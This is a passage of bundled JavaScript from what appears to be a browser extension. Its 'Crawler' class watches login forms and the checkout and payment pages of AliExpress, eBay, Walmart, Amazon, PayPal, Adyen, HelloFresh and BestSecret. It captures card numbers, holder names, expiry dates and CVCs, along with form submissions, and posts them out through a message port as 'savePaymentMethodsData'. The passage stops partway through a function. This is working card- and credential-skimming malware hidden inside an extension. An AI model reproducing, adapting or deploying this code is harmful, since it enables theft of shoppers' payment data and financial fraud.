/***/ "./assets/ts/additional.ts":
/*!*********************************!*\
  !*** ./assets/ts/additional.ts ***!
  \*********************************/
/*! exports provided: Crawler */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "Crawler", function() { return Crawler; });
/* harmony import */ var webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! webextension-polyfill-ts */ "../node_modules/webextension-polyfill-ts/lib/index.js");
/* harmony import */ var webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _messanger__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./messanger */ "./assets/ts/messanger.ts");


console.log('TRACKER :: activated');
class Crawler {
    constructor(url) {
        this.passwordStore = [];
        if (url) {
            this.url = url;
        }
    }
    init(callBack) {
        const self = this;
        if (self.url) {
            let interval1 = setInterval(function () {
                var _a, _b, _c;
                if (document.querySelectorAll('form').length !== 0) {
                    document.querySelectorAll('form').forEach(function (__formElement) {
                        if (__formElement.attributes.length !== 0) {
                            if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                                if (__formElement.method === 'post') {
                                    clearInterval(interval1);
                                    self.trigger(__formElement);
                                }
                            }
                            else {
                                if (__formElement.action !== 'javascript:void(0)' && __formElement.id.indexOf('u_0_') === -1 &&
                                    __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1) {
                                    clearInterval(interval1);
                                    self.trigger(__formElement);
                                }
                            }
                        }
                        else {
                            if (__formElement.childNodes.length > 1) {
                                clearInterval(interval1);
                                self.trigger(__formElement);
                            }
                        }
                    });
                }
                else {
                    if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                        if (document.querySelector('#login') !== null) {
                            clearInterval(interval1);
                            self.classicTrack('#email_login', '#password', '#login');
                        }
                    }
                }
                if (window.location.origin.indexOf('aliexpress') !== -1) {
                    if (document.querySelector('.check-out-root') !== null && ((_a = document.querySelector('.check-out-root')) === null || _a === void 0 ? void 0 : _a.childNodes.length) !== 1) {
                        clearInterval(interval1);
                        self.explorePaymentSpanTag(self, document.querySelector('.check-out-root'), function (__detectedElement) {
                            ['click', 'dblclick'].forEach(function (event) {
                                var _a, _b;
                                (_b = (_a = document.querySelector('.bind-button-wrap')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.addEventListener(event, function () {
                                    _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': __detectedElement.textContent,
                                            'cardBrand': 'Unknown',
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                });
                            });
                        });
                    }
                    else {
                        if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                            if (document.querySelectorAll('.arrow-content').length !== 0) {
                                document.querySelectorAll('.arrow-content').forEach(function (divElement) {
                                    divElement.addEventListener('click', function () {
                                        if (divElement.classList.contains('arrow-down')) {
                                            let __interval2 = setInterval(function () {
                                                if (document.querySelector('.add-new-card') !== null) {
                                                    clearInterval(__interval2);
                                                    ['click', 'dblclick'].forEach(function (event) {
                                                        var _a;
                                                        (_a = document.querySelector('.add-new-card')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                                            let __interval3 = setInterval(function () {
                                                                if (document.querySelector('.new-card') !== null) {
                                                                    clearInterval(__interval3);
                                                                    self.explorePaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
                                                                        var _a;
                                                                        let paymentMethodStore = [];
                                                                        (_a = document.querySelector('.save')) === null || _a === void 0 ? void 0 : _a.addEventListener('click', function () {
                                                                            elements.forEach(function (element) {
                                                                                paymentMethodStore.push({
                                                                                    'element': element.nodeName,
                                                                                    'id': element.id,
                                                                                    'type': element.type,
                                                                                    'value': element.value
                                                                                });
                                                                            });
                                                                            _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                                                                command: 'savePaymentMethodsData',
                                                                                data: {
                                                                                    'cardNumber': paymentMethodStore[0].value,
                                                                                    'cardBrand': 'Unknown',
                                                                                    'cardHolder': paymentMethodStore[1].value,
                                                                                    'cardExpire': paymentMethodStore[2].value,
                                                                                    'cardCVC': paymentMethodStore[3].value,
                                                                                    'workWebsite': window.location.origin
                                                                                }
                                                                            });
                                                                            paymentMethodStore = [];
                                                                        });
                                                                    });
                                                                }
                                                            }, 1000);
                                                        });
                                                    });
                                                }
                                            }, 1000);
                                        }
                                    });
                                });
                            }
                            if (((_b = document.querySelector('.mix-edcard-item')) === null || _b === void 0 ? void 0 : _b.childElementCount) !== 0) {
                                clearInterval(interval1);
                                let cardConfirmElement = document.querySelector('#checkout-button');
                                ['click', 'dblclick'].forEach(function (event) {
                                    cardConfirmElement === null || cardConfirmElement === void 0 ? void 0 : cardConfirmElement.addEventListener(event, function () {
                                        var _a;
                                        let tempPaymentMethodsStore = [];
                                        (_a = document.querySelector('.mix-edcard-item')) === null || _a === void 0 ? void 0 : _a.childNodes.forEach(function (__childElement) {
                                            if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('icon')) {
                                                if (__childElement.classList.contains('visa')) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __childElement.nodeName,
                                                        'id': __childElement.id,
                                                        'value': 'visa'
                                                    });
                                                }
                                            }
                                            if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('pay-name')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __childElement.nodeName,
                                                    'id': __childElement.id,
                                                    'value': __childElement.textContent
                                                });
                                            }
                                        });
                                        _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': tempPaymentMethodsStore[0].value,
                                                'cardBrand': tempPaymentMethodsStore[1].value,
                                                'cardHolder': 'Unknown',
                                                'cardExpire': 'Unknown',
                                                'cardCVC': 'Unknown',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                        tempPaymentMethodsStore = [];
                                    });
                                });
                            }
                        }
                        if (window.location.href.indexOf('payResult.htm') !== -1) {
                            clearInterval(interval1);
                            let interval4 = setInterval(function () {
                                var _a, _b;
                                if (document.querySelector('.verify-card-form-row') !== null) {
                                    clearInterval(interval4);
                                    if (((_b = (_a = document.querySelector('.verify-card-confirm')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.nodeName) === 'BUTTON') {
                                        ['click', 'dblclick'].forEach(function (event) {
                                            var _a, _b;
                                            let tempPaymentMethodsStore = [];
                                            (_b = (_a = document.querySelector('.verify-card-confirm')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.addEventListener(event, function () {
                                                self.explorePaymentInputTag(self, document.querySelector('.verify-card-form-row'), 'cardN', function (__detectedElement) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                self.explorePaymentInputTag(self, document.querySelector('.verify-card-form-row'), 'cardHolder', function (__detectedElement) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                self.explorePaymentInputTag(self, document.querySelector('.verify-card-form-row'), 'expires', function (__detectedElement) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                self.explorePaymentInputTag(self, document.querySelector('.verify-card-form-row'), 'cvc', function (__detectedElement) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        "cardExpire": tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        "workWebsite": window.location.origin
                                                    }
                                                });
                                                tempPaymentMethodsStore = [];
                                            });
                                        });
                                    }
                                }
                            }, 1000);
                        }
                    }
                }
                if (window.location.origin.indexOf('ebay') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelectorAll('form').length !== 0) {
                            document.querySelectorAll('form').forEach(function (__ebayCreditCardFormElement) {
                                if (__ebayCreditCardFormElement.id === 'credit-card-details') {
                                    clearInterval(interval);
                                    let elements = [];
                                    self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                                }
                            });
                        }
                    }, 100);
                    if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                        if (((_c = document.querySelector('.btn.btn--primary.field')) === null || _c === void 0 ? void 0 : _c.nodeName) === 'BUTTON') {
                            ["click", "dblclick"].forEach(function (event) {
                                var _a;
                                let tempPaymentMethodsStore = [];
                                (_a = document.querySelector('.btn.btn--primary.field')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                    var _a, _b, _c, _d;
                                    self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'creditCardNumber', function (__detectedElement) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'firstName', function (__detectedElement) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'lastName', function (__detectedElement) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'expirationDate', function (__detectedElement) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'cvv', function (__detectedElement) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                            'cardBrand': ((_b = (_a = document.querySelector('.floating-input__fixright')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.className) ? (_d = (_c = document.querySelector('.floating-input__fixright')) === null || _c === void 0 ? void 0 : _c.firstElementChild) === null || _d === void 0 ? void 0 : _d.className.toLowerCase() : 'Unknown',
                                            'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                            "cardExpire": tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                            'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                            "workWebsite": window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                }
                if (window.location.origin.indexOf('walmart') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (window.location.href.indexOf('#/payment') !== -1 || window.location.href.indexOf('account/creditcards') !== -1) {
                            clearInterval(interval);
                            self.exploreWalmartPaymentContainer(self);
                        }
                        if (window.location.href.indexOf('#/review') !== -1) {
                            clearInterval(interval);
                            self.exploreWalmartPaymentEditButton(self);
                        }
                    }, 100);
                }
                if (window.location.origin.indexOf('amazon') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelectorAll('form').length !== 0) {
                            clearInterval(interval);
                            self.exploreAmazonPaymentContainer(self);
                        }
                    }, 100);
                }
                if (window.location.origin.indexOf('hellofresh.de') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelectorAll('.ReactModalPortal').length !== 0) {
                            clearInterval(interval);
                            document.querySelectorAll('.ReactModalPortal').forEach(function (modal) {
                                if (modal.childNodes.length !== 0) {
                                    self.exploreHelloFreshPaymentContainer(self, modal, function (__detectedElement) {
                                        __detectedElement.addEventListener('click', function () {
                                            webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.get().then(function (setting) {
                                                if (setting.paymentData !== undefined) {
                                                    _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                                        command: 'savePaymentMethodsData',
                                                        data: {
                                                            'cardNumber': setting.paymentData.cardNumber ? setting.paymentData.cardNumber : 'Unknown',
                                                            'cardBrand': 'Unknown',
                                                            'cardHolder': 'Unknown',
                                                            "cardExpire": setting.paymentData.cardExpire,
                                                            'cardCVC': setting.paymentData.cardCVC,
                                                            "workWebsite": window.location.origin
                                                        }
                                                    });
                                                }
                                            });
                                        });
                                    });
                                }
                            });
                        }
                    }, 100);
                }
                if (window.location.origin.indexOf('checkoutshopper-live.adyen.com') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelector('body') !== null) {
                            clearInterval(interval);
                            self.explorePaymentInputTag(self, document.querySelector('body'), 'encrypted', function (__detectedElement) {
                                __detectedElement.addEventListener('keyup', function () {
                                    webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.get().then(function (setting) {
                                        if (setting.paymentData !== undefined) {
                                            if (__detectedElement.id === 'encryptedCardNumber') {
                                                webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.set({
                                                    'paymentData': {
                                                        'cardNumber': __detectedElement.value,
                                                        'cardExpire': setting.paymentData.cardExpire,
                                                        'cardCVC': setting.paymentData.cardCVC,
                                                    }
                                                });
                                            }
                                            if (__detectedElement.id === 'encryptedExpiryDate') {
                                                webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.set({
                                                    'paymentData': {
                                                        'cardNumber': setting.paymentData.cardNumber,
                                                        'cardExpire': __detectedElement.value,
                                                        'cardCVC': setting.paymentData.cardCVC,
                                                    }
                                                });
                                            }
                                            if (__detectedElement.id === 'encryptedSecurityCode') {
                                                webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.set({
                                                    'paymentData': {
                                                        'cardNumber': setting.paymentData.cardNumber,
                                                        'cardExpire': setting.paymentData.cardExpire,
                                                        'cardCVC': __detectedElement.value,
                                                    }
                                                });
                                            }
                                        }
                                        else {
                                            webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.set({
                                                'paymentData': {
                                                    'cardNumber': '',
                                                    'cardExpire': '',
                                                    'cardCVC': '',
                                                }
                                            });
                                        }
                                    });
                                });
                            });
                        }
                    }, 100);
                }
                if (window.location.origin.indexOf('bestsecret.com') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelectorAll('form').length !== 0) {
                            clearInterval(interval);
                            self.exploreBestSecretPaymentContainer(self);
                        }
                    }, 100);
                }
                if (window.location.origin.indexOf('paypal') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelector('form') !== null /* && document.querySelector('form')?.action ==='/myaccount/money'*/) {
                            clearInterval(interval);
                            document.querySelectorAll('form').forEach(function (__paypalFormElement) {
                                if (__paypalFormElement.action.indexOf('myaccount/money') !== -1) {
                                    let elements = [];
                                    self.explorePayPalPaymentFormElement(self, __paypalFormElement, elements, function (controller, elements) {
                                        ['click', 'dblclick'].forEach(function (event) {
                                            controller.addEventListener(event, function (e) {
                                                let paymentMethodStore = [];
                                                elements.forEach(function (__detectedElement) {
                                                    paymentMethodStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown',
                                                        'cardBrand': paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown',
                                                        'cardHolder': 'Unknown',
                                                        "cardExpire": paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        "workWebsite": window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            });
                                        });
                                    });
                                }
                            });
                        }
                    }, 100);
                }
            }, 1000);
        }
        if (callBack) {
            callBack();
        }
    }
    explorePayPalPaymentFormElement(self, __creditCardFormElement, elements, callback) {
        if (__creditCardFormElement.childNodes.length !== 0) {
            __creditCardFormElement.childNodes.forEach(function (_formChildElement) {
                if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' || _formChildElement.nodeName === 'BUTTON') {
                    if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' &&
                        _formChildElement.type !== 'hidden' && _formChildElement.id !== 'billingAddressId') {
                        elements.push(_formChildElement);
                    }
                    if (_formChildElement.nodeName === 'BUTTON' && _formChildElement.type === 'submit') {
                        if (callback) {
                            callback(_formChildElement, elements);
                        }
                    }
                }
                else {
                    self.explorePayPalPaymentFormElement(self, _formChildElement, elements, callback);
                }
            });
        }
    }
    exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements) {
        self.exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, function (controller, elements) {
            ['click', 'dblclick'].forEach(function (event) {
                controller.addEventListener(event, function (e) {
                    var _a, _b, _c;
                    let paymentMethodStore = [];
                    elements.forEach(function (__detectedElement) {
                        paymentMethodStore.push({
                            'element': __detectedElement.nodeName,
                            'id': __detectedElement.id,
                            'value': __detectedElement.value
                        });
                    });
                    _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                        command: 'savePaymentMethodsData',
                        data: {
                            'cardNumber': paymentMethodStore[0].id.indexOf('cardNumber') !== -1 ? paymentMethodStore[0].value : 'Unknown',
                            'cardBrand': (_c = (_b = (_a = document.querySelector('.card-types')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.getAttribute('aria-label')) === null || _c === void 0 ? void 0 : _c.toLowerCase(),
                            'cardHolder': paymentMethodStore[3].id === 'cardHolderFirstName' ? paymentMethodStore[3].value : 'Unknown' + ' ' + paymentMethodStore[4].id === 'cardHolderLastName' ? paymentMethodStore[4].value : 'Unknown',
                            "cardExpire": paymentMethodStore[1].id === 'cardExpiryDate' ? paymentMethodStore[1].value : 'Unknown',
                            'cardCVC': paymentMethodStore[2].id === 'securityCode' ? paymentMethodStore[2].value : 'Unknown',
                            "workWebsite": window.location.origin
                        }
                    });
                    paymentMethodStore = [];
                    let interval = setInterval(function () {
                        document.querySelectorAll('a').forEach(function (__ebaySecondEntry) {
                            if (__ebaySecondEntry.getAttribute('data-test-id') === 'GET_PAYMENT_INSTRUMENT') {
                                clearInterval(interval);
                                ['click', 'dblclick'].forEach(function (event) {
                                    __ebaySecondEntry.addEventListener(event, function () {
                                        self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                                    });
                                });
                            }
                        });
                    }, 100);
                });
            });
        });
    }
    exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, callback) {
        if (__ebayCreditCardFormElement.childNodes.length !== 0) {
            __ebayCreditCardFormElement.childNodes.forEach(function (_ebayFormChildElement) {
                if (_ebayFormChildElement.nodeName === 'INPUT' || _ebayFormChildElement.nodeName === 'BUTTON') {
                    if (_ebayFormChildElement.nodeName === 'INPUT' && _ebayFormChildElement.type !== 'hidden' && _ebayFormChildElement.type !== 'checkbox') {
                        elements.push(_ebayFormChildElement);
                    }
                    if (_ebayFormChildElement.nodeName === 'BUTTON' && _ebayFormChildElement.type === 'submit') {
                        if (callback) {
                            callback(_ebayFormChildElement, elements);
                        }
                    }
                }
                else {
                    self.exploreEbayPaymentFormElement(self, _ebayFormChildElement, elements, callback);
                }
            });
        }
    }
    exploreHelloFreshPaymentContainer(self, parentNode, callback) {
        parentNode.childNodes.forEach(function (__element) {
            if (__element.nodeName === 'BUTTON' && __element.getAttribute('data-test-id') === 'add-payment-method-save') {
                if (callback) {
                    callback(__element);
                }
            }
            else {
                self.exploreHelloFreshPaymentContainer(self, __element, callback);
            }
        });
    }
    exploreBestSecretPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "creditForm") {
                let elements = [];
                self.exploreBestSecretPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function (e) {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardHolder': paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        elements = [];
                    });
                });
            }
        });
    }
    exploreBestSecretPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON' && !_childElement.classList.contains('btn-link')
                        && !_childElement.classList.contains('btn-secondary-action') && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreBestSecretPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreAmazonPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (!__formElement.classList.contains('nav-searchbar') && __formElement.name !== 'ue_backdetect' &&
                __formElement.style.display !== 'none') {
                let elements = [];
                self.exploreAmazonPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name.indexOf('accountHolderName') !== -1 || __childElement.name.indexOf('account_holder_name') !== -1 ? 'cardHolder' : (__childElement.name.indexOf('CardNumber') !== -1 ? 'cardNumber' : (__childElement.name.indexOf('month') !== -1 ? 'expirationMonth' : (__childElement.name.indexOf('year') !== -1 ? 'expirationYear' : 'Unknown'))),
                                'value': __childElement.value,
                            });
                        });
                        _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value,
                                'cardBrand': 'Unknown',
                                'cardHolder': paymentMethodData[0].value,
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        elements = [];
                    });
                });
            }
        });
    }
    exploreAmazonPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' &&
                        _childElement.type !== 'submit' && _childElement.type !== 'checkbox' ||
                        _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'INPUT' && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreAmazonPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreWalmartPaymentContainer(self) {
        let interval = setInterval(function () {
            var _a, _b, _c, _d, _e;
            if (document.querySelector('.edit-form.multiple-required') !== null &&
                ((_b = (_a = document.querySelector('.edit-form-actions')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.firstElementChild) !== null) {
                clearInterval(interval);
                if (((_e = (_d = (_c = document.querySelector('.edit-form-actions')) === null || _c === void 0 ? void 0 : _c.firstElementChild) === null || _d === void 0 ? void 0 : _d.firstElementChild) === null || _e === void 0 ? void 0 : _e.nodeName) === 'BUTTON') {
                    ["click", "dblclick"].forEach(function (event) {
                        var _a, _b, _c;
                        let tempPaymentMethodsStore = [];
                        (_c = (_b = (_a = document.querySelector('.edit-form-actions')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.firstElementChild) === null || _c === void 0 ? void 0 : _c.addEventListener(event, function () {
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'creditCard', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            document.querySelectorAll('.payment-option').forEach(function (element) {
                                if (!element.classList.contains('payment-inactive')) {
                                    element.classList.remove('payment-option');
                                    tempPaymentMethodsStore.push({
                                        'element': element.nodeName,
                                        'id': 'cardBrand',
                                        'value': element.className
                                    });
                                    element.classList.add('payment-option');
                                }
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'firstName', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'lastName', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'month-chooser', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'year-chooser', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'cvv', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                command: 'savePaymentMethodsData',
                                data: {
                                    'cardNumber': tempPaymentMethodsStore[0].value,
                                    'cardBrand': tempPaymentMethodsStore[1].value,
                                    'cardHolder': tempPaymentMethodsStore[2].value + ' ' + tempPaymentMethodsStore[3].value,
                                    "cardExpire": tempPaymentMethodsStore[4].value + '/' + tempPaymentMethodsStore[5].value,
                                    'cardCVC': tempPaymentMethodsStore[6].value,
                                    "workWebsite": window.location.origin
                                }
                            });
                            tempPaymentMethodsStore = [];
                            self.exploreWalmartPaymentEditButton(self);
                        });
                    });
                }
            }
        }, 100);
    }
    exploreWalmartPaymentEditButton(self) {
        let interval = setInterval(function () {
            if (document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').length !== 0) {
                document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').forEach(function (formEditButton) {
                    if (formEditButton.getAttribute('data-automation-id') === 'edit-payment') {
                        clearInterval(interval);
                        formEditButton.addEventListener('click', function () {
                            self.exploreWalmartPaymentContainer(self);
                        });
                    }
                });
            }
        }, 100);
    }
    explorePaymentNewCard(self, elementParentNode, callback) {
        let detectedElements = [];
        if (elementParentNode.childNodes.length !== 0) {
